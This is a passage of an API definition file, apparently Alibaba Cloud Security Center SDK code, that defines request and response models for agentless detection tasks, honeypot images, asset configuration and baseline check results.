async function listAgentlessRiskUuid(request: ListAgentlessRiskUuidRequest): ListAgentlessRiskUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAgentlessRiskUuid', 'POST', '/', 'json', false, 'json', request);
}

model ListAgentlessTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  endTime?: long(name='EndTime', description='The end timestamp of the task.', example='1635575219000', position='Query'),
  internetIp?: string(name='InternetIp', description='The public IP address of the asset that you want to query.', example='1.1.XX.XX', position='Query'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the asset that you want to query.', example='172.26.XX.XX', position='Query'),
  lang?: string(name='Lang', description='The language type. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  machineName?: string(name='MachineName', description='The name of the instance.', example='oracle-win-001****', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  rootTask?: boolean(name='RootTask', description='Specifies whether to query main tasks. Valid values:

*   **true**: queries main tasks.
*   **false**: queries subtasks.', example='false', position='Query'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the main task.', example='12c27343861610c5db3f7a2573b4****', position='Query'),
  startTime?: long(name='StartTime', description='The start timestamp of the task.', example='1651290987000', position='Query'),
  status?: int32(name='Status', description='The status of the detection task.

*   **1**: The detection task is in progress.
*   **2**: The detection task is complete.
*   **3**: The detection task fails.
*   **4**: The detection task times out.', example='2', position='Query'),
  targetName?: string(name='TargetName', description='The name of the asset that you want to detect.', example='source-test-obj-0****', position='Query'),
  targetType?: int32(name='TargetType', description='The type of the asset that you want to detect. Valid values:

*   **1**: snapshot
*   **2**: image', example='1', position='Query'),
  taskId?: string(name='TaskId', description='The ID of the main task. If you want to query subtasks of a main task, you must specify this parameter.', example='d7b2acf8d362742123e4a84e1bf8****', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='e4af3620-6895-4e2f-a641-a9d8fb53****', position='Query'),
}

model ListAgentlessTaskResponseBody = {
  list?: [ 
    {
      endTime?: long(name='EndTime', description='The end timestamp of the task. Unit: milliseconds.', example='1678895999999'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      progress?: int32(name='Progress', description='The progress of the task.', example='60'),
      result?: string(name='Result', description='The result of the detection.', example='True'),
      startTime?: long(name='StartTime', description='The start timestamp of the task. Unit: milliseconds.', example='1672741657897'),
      status?: int32(name='Status', description='The status of the detection task.

*   **1**: The detection task is in progress.
*   **2**: The detection task is complete.
*   **3**: The detection task fails.
*   **4**: The detection task times out.', example='1'),
      targetName?: string(name='TargetName', description='The name of the asset that is detected.', example='hkdevt****'),
      targetType?: int32(name='TargetType', description='The type of the asset that is detected. Valid values:

*   **1**: snapshot
*   **2**: image', example='2'),
      taskId?: string(name='TaskId', description='The ID of the task.', example='1538****'),
      taskName?: string(name='TaskName', description='The name of the detection task.', example='AGENTLESS_SCAN'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The tasks.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model ListAgentlessTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAgentlessTaskResponseBody(name='body'),
}

async function listAgentlessTask(request: ListAgentlessTaskRequest): ListAgentlessTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAgentlessTask', 'POST', '/', 'json', false, 'json', request);
}

model ListAssetCleanConfigRequest {
}

model ListAssetCleanConfigResponseBody = {
  count?: int32(name='Count', description='The number of cleanup configurations.', example='1'),
  data?: [ 
    {
      cleanDays?: int32(name='CleanDays', description='The number of days before hosts whose provider cannot be identified are automatically cleaned after they enter the offline state. Valid value: an integer that ranges from 1 to 30.', example='7'),
      status?: int32(name='Status', description='Indicates whether the configuration takes effect. Valid values:

*   **0**: The configuration does not take effect.
*   **1**: The configuration takes effect.', example='1'),
      type?: int32(name='Type', description='The type of hosts that are cleaned.

*   The value is set to **1**, which indicates hosts whose provider cannot be identified.', example='1'),
    }
  ](name='Data', description='The asset cleanup configurations.'),
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model ListAssetCleanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAssetCleanConfigResponseBody(name='body'),
}

async function listAssetCleanConfig(request: ListAssetCleanConfigRequest): ListAssetCleanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAssetCleanConfig', 'POST', '/', 'json', false, 'json', request);
}

model ListAssetRefreshTaskConfigRequest {
  refreshConfigType?: int32(name='RefreshConfigType', position='Query'),
  regionId?: string(name='RegionId', description='The region where the Security Center instance is deployed.', example='cn-hangzhou', position='Query'),
  targetId?: long(name='TargetId', position='Query'),
}

model ListAssetRefreshTaskConfigResponseBody = {
  assetRefreshConfig?: [ 
    {
      refreshConfigType?: int32(name='RefreshConfigType'),
      schedulePeriod?: int32(name='SchedulePeriod', description='The synchronization cycle. Valid values:

*   **60**: 60 minutes
*   **180**: 3 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 1 day
*   **10080**: 7 days', example='360'),
      status?: int32(name='Status', description='The status of asset synchonization. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **3**: Tencent Cloud
*   **4**: HUAWEI CLOUD
*   **7**: Amazon Web Services (AWS) Cloud', example='3'),
    }
  ](name='AssetRefreshConfig', description='An array that consist of the configurations.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model ListAssetRefreshTaskConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAssetRefreshTaskConfigResponseBody(name='body'),
}

async function listAssetRefreshTaskConfig(request: ListAssetRefreshTaskConfigRequest): ListAssetRefreshTaskConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAssetRefreshTaskConfig', 'POST', '/', 'json', false, 'json', request);
}

model ListAssetSelectionSelectedTargetRequest {
  selectionKey: string(name='SelectionKey', description='The unique ID of the asset.', example='2e6ab33d-4e00-4581-ac16-0dd1f9ad****', position='Query'),
  targetList?: [ string ](name='TargetList', description='The details of queries.', position='Query'),
}

model ListAssetSelectionSelectedTargetResponseBody = {
  data?: [ 
    {
      targetId?: string(name='TargetId', description='The ID of the asset.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset.', example='jen****'),
    }
  ](name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1EB12F73-6828-59D2-9FBF-F3713FD55128'),
}

model ListAssetSelectionSelectedTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAssetSelectionSelectedTargetResponseBody(name='body'),
}

async function listAssetSelectionSelectedTarget(request: ListAssetSelectionSelectedTargetRequest): ListAssetSelectionSelectedTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAssetSelectionSelectedTarget', 'POST', '/', 'json', false, 'json', request);
}

model ListAssetSelectionTargetRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  selectionKey: string(name='SelectionKey', description='The globally unique identifier (GUID) of the asset.', example='8ccf9b01-2c64-4cba-8122-10115f29****', position='Query'),
}

model ListAssetSelectionTargetResponseBody = {
  data?: [ 
    {
      targetId?: string(name='TargetId', description='The ID of the asset.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset.', example='test****'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='639'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='50A75355-F58F-5D65-8377-98C88DED9C51'),
}

model ListAssetSelectionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAssetSelectionTargetResponseBody(name='body'),
}

async function listAssetSelectionTarget(request: ListAssetSelectionTargetRequest): ListAssetSelectionTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAssetSelectionTarget', 'POST', '/', 'json', false, 'json', request);
}

model ListAvailableHoneypotRequest {
  nodeId?: string(name='NodeId', description='The ID of the management node to which the honeypot is deployed.', example='4341018b-8e01-43f6-b1d2-af29a2a4****', position='Query'),
}

model ListAvailableHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of images that are used for the honeypot.', example='22'),
  data?: [ 
    {
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image.', example='RuoYi'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image.', example='sha256:007095d6de9c7a343e9fc1f74a7efc9c5de9d5454789d2fa505a1b3fc62****'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='ruoyi'),
      honeypotImageType?: string(name='HoneypotImageType', description='The type of the image.', example='Web'),
      honeypotImageVersion?: string(name='HoneypotImageVersion', description='The version of the image.', example='1.0.2'),
      multiports?: string(name='Multiports', description='The port that is supported by the honeypot. The value is in the JSON format. Valid values:

*   **log_type**: the log type
*   **proto**: the supported protocol
*   **description**: the description
*   **ports**: the supported ports
*   **port_str**: the supported port number of the string type
*   **type**: the type', example='[{"log_type":"web","proto":"tcp","description":"webServerPort","ports":[80.0],"port_str":"80","type":"web"}]'),
      proto?: string(name='Proto', description='The protocol that is supported by the honeypot.', example='tcp'),
      servicePort?: string(name='ServicePort', description='The service port of the honeypot.', example='27017.0'),
      template?: string(name='Template', description='The configuration template of the honeypot.', example='{}'),
    }
  ](name='Data', description='An array consisting of the information about the images that are used for the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6C24D883-984D-52FD-BB66-5F89F86E4837'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListAvailableHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAvailableHoneypotResponseBody(name='body'),
}

async function listAvailableHoneypot(request: ListAvailableHoneypotRequest): ListAvailableHoneypotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListAvailableHoneypot', 'POST', '/', 'json', false, 'json', request);
}

model ListCheckInstanceResultRequest {
  checkId: long(name='CheckId', description='The ID of the check item.', example='23', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  instanceIdKey?: string(name='InstanceIdKey', description='The ID of the instance.', example='i-uf64w4q6p9jti5gl****', position='Query'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of cloud services.', position='Query'),
  instanceNameKey?: string(name='InstanceNameKey', description='The name of the instance.', example='i-uf64w4q6p9jti5gl****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  regionIdKey?: string(name='RegionIdKey', description='The region ID of the instance.', example='cn-qingdao', position='Query'),
  sortTypes?: [ string ](name='SortTypes', description='The types of the conditions based on which the check items are sorted.', position='Query'),
  statuses?: [ string ](name='Statuses', description='The statuses of check items.', position='Query'),
}

model ListCheckInstanceResultResponseBody = {
  basicData?: [ 
    {
      id?: long(name='Id', description='The check result ID of the instance.', example='300054'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='rm-m5es7ch1s62i4****'),
      instanceName?: string(name='InstanceName', description='The name of the instance.', example='sg-t4nbk2aodzio52xv****'),
      regionId?: string(name='RegionId', description='The ID of the region in which the instance resides.', example='ap-southeast-1'),
      status?: string(name='Status', description='The states of check items. Multiple states are separated with commas (,). Valid values:

*   **PASS**: The instance passed the check.
*   **NOT_PASS**: The instance failed to pass the check.
*   **CHECKING**: The instance is being checked.
*   **NOT_CHECK**: The instance is not checked.
*   **WHITELIST**: The instance is in the whitelist.', example='NOT_PASS'),
      statusMessage?: string(name='StatusMessage', description='The information about the exceptions of check items.', example='Task is failed.'),
    }
  ](name='BasicData', description='The basic information about the affected instances.'),
  checks?: [ map[string]any ](name='Checks', description='The extended information about the instances.', example='[{
	"SecurityGroupNameShow": {
		"value": "Sas_Malicious_Ip_Security_Group"
	},
	"InstanceIdShow": {
		"link": "https://ecs.console.aliyun.com/#/securityGroupDetail/region/ap-southeast-1/groupId/sg-t4nbk2aodzio52xvj00s/rule/intranetIngress",
		"value": "sg-t4nbk2aodzio52xv****"
	}
}]'),
  columns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key', description='The search condition.', example='RegionIdShow'),
          showName?: string(name='ShowName', description='The display name of the search condition.', example='Region'),
          type?: string(name='Type', description='The format of the check results for the instance. Valid values:

*   **text**
*   **link**', example='text'),
        }
      ](name='Grids', description='The metadata information about the details of the instance.'),
      key?: string(name='Key', description='The search condition.', example='RegionIdShow'),
      search?: boolean(name='Search', description='Indicates whether the search condition is supported. Valid values:

*   **true**
*   **false**', example='true'),
      searchKey?: string(name='SearchKey', description='The value of the search condition.', example='InstanceIdKey'),
      showName?: string(name='ShowName', description='The display name of the search condition.', example='Region'),
      type?: string(name='Type', description='The format of the check result for the instance. Valid values:

*   **text**
*   **link**', example='text'),
    }
  ](name='Columns', description='The metadata information about the search conditions that can be used to filter instances.'),
  pageInfo?: {
    count?: string(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3AB18264-8A1B-52A6-A9AF-A886556E0F2E'),
}

model ListCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckInstanceResultResponseBody(name='body'),
}

async function listCheckInstanceResult(request: ListCheckInstanceResultRequest): ListCheckInstanceResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCheckInstanceResult', 'POST', '/', 'json', false, 'json', request);
}

model ListCheckItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid value:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='10', position='Query'),
}

model ListCheckItemResponseBody = {
  checkItems?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='21'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='Enable deletion protection'),
      customConfigs?: [ 
        {
          defaultValue?: string(name='DefaultValue', description='The default value of the check item. The value is a string.', example='0'),
          name?: string(name='Name', description='The name of the check item.', example='IPList'),
          showName?: string(name='ShowName', description='The display name of the check item.', example='Ensure RAM password policy prevents password reuse'),
          typeDefine?: string(name='TypeDefine', description='The type of the check item. The value is a JSON string.', example='{\\"type\\":\\"LIST\\",\\"range\\":[1,512],\\"listType\\":{\\"type\\":\\"STRING\\",\\"range\\":[0,22]}}'),
          value?: string(name='Value', description='The specified value of the check item. The value is a string.', example='1'),
        }
      ](name='CustomConfigs', description='The check items.'),
      description?: {
        type?: string(name='Type', description='The type of the description of the check item. Valid value:

*   **text**', example='text'),
        value?: string(name='Value', description='The content of the description for the check item when the Type parameter is text.', example='The download of query results that are returned by SELECT statements in DataStudio must be prohibited at the MaxCompute level.'),
      }(name='Description', description='The description of the check item.'),
      instanceSubType?: string(name='InstanceSubType', description='The asset subtype of the cloud service. Valid value:

*   If **InstanceType** is set to **ECS**, this parameter supports the following valid values:

    *   **INSTANCE**
    *   **DISK**
    *   **SECURITY_GROUP**

*   If **InstanceType** is set to **ACR**, this parameter supports the following valid values:

    *   **REPOSITORY_ENTERPRISE**
    *   **REPOSITORY_PERSON**

*   If **InstanceType** is set to **RAM**, this parameter supports the following valid values:

    *   **ALIAS**
    *   **USER**
    *   **POLICY**
    *   **GROUP**

*   If **InstanceType** is set to **WAF**, this parameter supports the following valid values:

    *   **DOMAIN**

*   If **InstanceType** is set to other values, this parameter supports the following valid values:

    *   **INSTANCE**', example='ECS'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud service. Valid value:

*   **ECS**: Elastic Compute Service (ECS)
*   **SLB**: Server Load Balancer (SLB)
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB)
*   **KVSTORE**: ApsaraDB for Redis (Redis)
*   **ACR**: Container Registry
*   **CSK**: Container Service for Kubernetes (ACK)
*   **VPC**: Virtual Private Cloud (VPC)
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: Alibaba Cloud CDN (CDN)
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: Resource Access Management (RAM)
*   **DDOS**: Anti-DDoS
*   **WAF**: Web Application Firewall (WAF)
*   **OSS**: Object Storage Service (OSS)
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: Microservices Engine (MSE)
*   **NAS**: Apsara File Storage NAS (NAS)
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP)
*   **EIP**: Elastic IP Address (EIP)', example='OSS'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid value:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
      sectionIds?: [ long ](name='SectionIds', description='The IDs of the sections associated with the check items.'),
      vendor?: string(name='Vendor', description='The type of the cloud asset. Valid value:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a simple application server', example='0'),
    }
  ](name='CheckItems', description='The check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model ListCheckItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemResponseBody(name='body'),
}

async function listCheckItem(request: ListCheckItemRequest): ListCheckItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCheckItem', 'POST', '/', 'json', false, 'json', request);
}

model ListCheckItemWarningMachineRequest {
  checkId: long(name='CheckId', description='The ID of the check item.', example='8', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to query containers.', example='clusterId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to query containers.', example='ce89cdd0ea732472a8703821b19e****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~130972~~) operation to query the ID of the asset group.', example='1161****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  remark?: string(name='Remark', description='The keyword that is used to query servers in fuzzy match mode.', example='225', position='Query'),
  riskType: string(name='RiskType', description='The type of the check item.', example='cis', position='Query'),
  source?: string(name='Source', description='The data source. Default value: default. Valid values:

*   **default**: The check items of baselines for hosts.
*   **agentless**: The check items of baselines for agentless detection.', example='agentless', position='Query'),
  status?: int32(name='Status', description='The status of the check item. Valid values:

*   1: failed

*   2: verifying

*   3: passed

*   6: ignored

*   7: fixing', example='3', position='Query'),
}

model ListCheckItemWarningMachineResponseBody = {
  list?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      containerId?: string(name='ContainerId', description='The container ID.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f9215570********'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='step-build-ui-build'),
      fixList?: [ 
        {
          riskId?: long(name='RiskId', description='The baseline ID.', example='72'),
          riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Linux/Aliyun Linux 2 Baseline for China classified protection of cybersecurity-Level II'),
        }
      ](name='FixList', description='The details of the baselines for which the risk item can be fixed.'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-bp1a69mvjujbakxu****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the affected asset.', example='172.25.XX.XX'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1694692471000'),
      portOpen?: boolean(name='PortOpen', description='Indicates whether a port on the server is accessible over the Internet. Valid values:

*   **true**
*   **false**', example='true'),
      prompt?: string(name='Prompt', description='The prompt for the risk item.', example='There is a weak password (username/password): root/he*****34'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-hangzhou'),
      status?: int32(name='Status', description='The status of the check item. Valid values:

*   1: failed
*   2: verifying
*   3: passed
*   6: ignored
*   7: fixing', example='1'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset that is scanned.', example='jenkins****'),
      targetType?: string(name='TargetType', description='The type of the asset. Valid values:

*   **ECS_SNAPSHOT**
*   **ECS_IMAGE**', example='ECS_IMAGE'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      warningRiskList?: [ 
        {
          riskId?: long(name='RiskId', description='The baseline ID.', example='72'),
          riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Linux/Aliyun Linux 2 Baseline for China classified protection of cybersecurity-Level II'),
        }
      ](name='WarningRiskList', description='The information about the baselines on which the risk item is detected.'),
    }
  ](name='List', description='The servers on which the alerts are generated.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of affected assets returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of affected assets.', example='107'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='22B5615F-700E-575A-A6D5-DC8D7741****'),
}

model ListCheckItemWarningMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningMachineResponseBody(name='body'),
}

async function listCheckItemWarningMachine(request: ListCheckItemWarningMachineRequest): ListCheckItemWarningMachineResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCheckItemWarningMachine', 'POST', '/', 'json', false, 'json', request);
}

model ListCheckItemWarningSummaryRequest {
  checkItemFuzzy?: string(name='CheckItemFuzzy', description='The name of the check item. Fuzzy match is supported.', example='password', position='Query'),
  checkLevel?: string(name='CheckLevel', description='The risk level. Default value: null, which indicates that check items at all risk levels are queried.Valid values:
*   **high**
*   **medium**
*   **low**', example='medium', position='Query'),
  checkType?: string(name='CheckType', description='The type of the check item.', example='hc.check.type.attack_defense', position='Query'),
  checkWarningStatus?: int32(name='CheckWarningStatus', description='The risk status. Default value: null, which indicates that check items in all states are queried.Valid values:
*   **1**: failed
*   **3**: passed', example='3', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to query containers.', example='clusterId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to query containers.', example='c471f0f61b9c04f8380556e922cf1****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='1161****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  riskType?: string(name='RiskType', description='The type of the baseline.', example='weak_password', position='Query'),
  source?: string(name='Source', description='The data source. Default value: **default**. Valid value:

*   **agentless**: The check items of baselines for agentless detection.
*   **default**: The check items of baselines for hosts.', example='agentless', position='Query'),
  uuidList?: [ string ](name='UuidList', position='Query'),
}

model ListCheckItemWarningSummaryResponseBody = {
  list?: [ 
    {
      advice?: string(name='Advice', description='The suggestion on the check item.', example='In the Administrative Tools window, double-click Local Security Policy. In the Local Security Policy window that appears, choose Security Settings\\\\Local Policies\\\\Audit Policy, configure all audit policies as: `Success, Failure`.'),
      affiliatedRiskTypes?: [ string ](name='AffiliatedRiskTypes'),
      affiliatedRisks?: [ string ](name='AffiliatedRisks'),
      alias?: string(name='Alias', description='The alias of the baseline type.', example='week_pa****'),
      checkId?: long(name='CheckId', description='The ID of the check item.', example='696'),
      checkItem?: string(name='CheckItem', description='The description of the check item.', example='Config the Event Audit policys'),
      checkLevel?: string(name='CheckLevel', description='The risk level of the check item.Valid values:
*   **high**
*  **medium**
*   **low**', example='high'),
      checkType?: string(name='CheckType', description='The type of the check item.', example='Security audit'),
      containerCheckItem?: boolean(name='ContainerCheckItem', description='Checks if the item belongs to the container runtime category.Valid values:
*   **true**
*  **false**', example='true'),
      description?: string(name='Description', description='The description of the check item.', example='Config the Event Audit policys'),
      riskType?: string(name='RiskType', description='The type of the baseline.', example='weak_password'),
      status?: int32(name='Status', description='The risk status of the check item.Valid values:
*  **1**: failed

*  **3**: passed', example='1'),
      warningMachineCount?: int32(name='WarningMachineCount', description='The number of servers that are affected by the check item.', example='20'),
    }
  ](name='List', description='An array that consists of the risk statistics of check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DC97C9EC-4B7D-5EFF-8A5E-A5CCC9ED****'),
}

model ListCheckItemWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningSummaryResponseBody(name='body'),
}

async function listCheckItemWarningSummary(request: ListCheckItemWarningSummaryRequest): ListCheckItemWarningSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCheckItemWarningSummary', 'POST', '/', 'json', false, 'json', request);
}

model ListCheckResultRequest {
  checkKey?: string(name='CheckKey', description='The key that you want to use to search for check items in fuzzy match mode.', example='OSS', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='2', position='Query'),
  customParam?: boolean(name='CustomParam', position='Query'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).', position='Query'),
  instanceTypes?: [ string ](name='InstanceTypes', description='The asset type of the cloud services. Valid values:

*   **ECS**: Elastic Compute Service (ECS)
